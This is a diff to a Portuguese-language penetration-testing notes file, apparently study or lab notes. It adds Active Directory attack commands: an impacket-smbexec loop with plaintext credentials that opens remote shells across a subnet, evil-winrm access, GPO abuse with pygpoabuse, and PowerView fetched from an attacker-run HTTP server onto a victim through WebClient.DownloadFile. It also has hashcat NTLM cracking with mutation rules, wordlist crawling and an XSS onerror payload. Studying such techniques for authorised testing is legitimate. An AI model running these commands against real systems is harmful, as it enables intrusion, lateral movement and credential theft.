@@ -2707,7 +2707,8 @@ Mutando uma wordlist existente
 
 Personalizar wordlist com dígito no fim e no início.
 
-    cewl site.com -m 7 
+    cewl site.com -m 7
+	github.com/ wordlister e cupp
 
 Busca palavras dentro do site com 7 chars, um Crawler de palavras
 
@@ -9111,6 +9112,12 @@ Código console.py abaixo
 
 ## MTIA
 
+ATAQUES GERAIS AO SMB
+
+	for i in {100,110,120.220,230};do impacket-smbexec praias/sampaio:sexywolfy@192.168.161.$i ;done
+	impacket-smbexec praias/sampaio:sexywolfy@192.168.161.110 ACESSA A SHELL DIRETO DO HOST CASO TENHA PERMISSAO
+	nxc ALTERNATIVA AO crackmapexec
+
 - ACTIVE DIRECTORY ATTACK STEP BY STEP
 
 Find users from Active Directory and save on a file
@@ -9272,15 +9279,35 @@ Ferarmenta de enumeração do AD da instalação à inserção de DADOS
 	python3 pygpoabuse.py SUB.DOMAIN.LOCAL/USER:'pass' -gpo-id "ID-DA-GPO-CAP-NO-BLOODHOUND"
 	ESPERAR O TEMPO DA GPO OU FORÇAR
 	evil-winrm -i SUB.DOMAIN.LOCAL -u jhn -p H4x00r123..
+		ACTIVE DIRECTORY POWERVIEW
+	Kali Linux
+	wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master
+	/Recon/PowerView.ps1
+	python3 -m http.server 8081
+	Servidor
+	xfreerdp /u:josemara /p:babygirl /d:praias /v:192.168.200.220 /cert-ignore cmd.exe
+	md c:\temp & cd c:\temp
+	powershell
+	(New-Object
+	System.Net.WebClient).DownloadFile("http://192.168.200.140:8081
+	/PowerView.ps1", "c:\temp\PowerView.ps1")
+	.. \PowerView.ps1
+	COMANDOS DO POWER VIEW
+		Get-NetDomain
+		Get-NetForest
+		Get-NetSID
+		Get-NetUser
+		Get-NetUser -Filter "Description=*password*"
+		Get-NetGroupMember -Name SuporteTI -Recurse
 
 
-ATAQUES GERAIS AO SMB
+Fazendo a quebra de hash passando a senha e a regra de mutação realizando a tentativa em tempo real
 
-	for i in {100,110,120.220,230};do impacket-smbexec praias/sampaio:sexywolfy@192.168.161.$i ;done
-	impacket-smbexec praias/sampaio:sexywolfy@192.168.161.110 ACESSA A SHELL DIRETO DO HOST CASO TENHA PERMISSAO
-	nxc ALTERNATIVA AO crackmapexec
+	hashcat -a 0 -m 1000 -w 4 hash.txt xato-net-10-million-passwords.txt -r /usr/share/hashcat/rules/best64.rule --loopback;
+
 
 - Modulo XSS
+
 payloads XSS
 
 	src=1'onerror='alert(')'
